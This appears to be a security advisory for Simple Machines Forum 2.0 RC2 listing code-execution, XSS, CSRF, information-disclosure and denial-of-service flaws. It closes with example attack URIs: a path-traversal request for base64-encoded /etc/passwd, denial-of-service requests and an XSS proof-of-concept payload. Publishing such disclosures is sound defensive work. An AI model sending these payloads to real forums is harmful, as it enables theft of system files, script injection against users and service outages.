Simple Machines Forum is prone to multiple security vulnerabilities:

- A remote PHP code-execution vulnerability
- Multiple cross-site scripting vulnerabilities
- Multiple cross-site request-forgery vulnerabilities
- An information-disclosure vulnerability
- Multiple denial-of-service vulnerabilities

Attackers can exploit these issues to execute arbitrary script code within the context of the webserver, perform unauthorized actions on behalf of legitimate users, compromise the affected application, steal cookie-based authentication credentials, obtain information that could aid in further attacks or cause denial-of-service conditions.

Please note some of these issues may already be described in other BIDs. This BID will be updated if further analysis confirms this.

These issues affect Simple Machines Forum 2.0 RC2. Some of these issues also affect version 1.1.10.

An attacker can use a browser to exploit these issues. To exploit the cross-site scripting and cross-site request-forgery vulnerabilities, the attacker must entice an unsuspecting victim into following a malicious URI.

The following example URIs are available:

For information-disclosure issue issue:
http://server/index.php?action=admin;area=logs;sa=errorlog;file=L2V0Yy9wYXNzd2Q==

For denial-of-service issue:
GET /.xml.html;sa=news;limit=999;type=rss HTTP/1.1

For denial-of-service issue (cookie):
Cookie: GLOBALS

For cross-site scripting issues:
http://server/index.php?action=admin;area=languages;sa=add;[token]
PoC: "><xss>

http://server/index.php?action=admin;area=theme;sa=settings;th=2;[token]
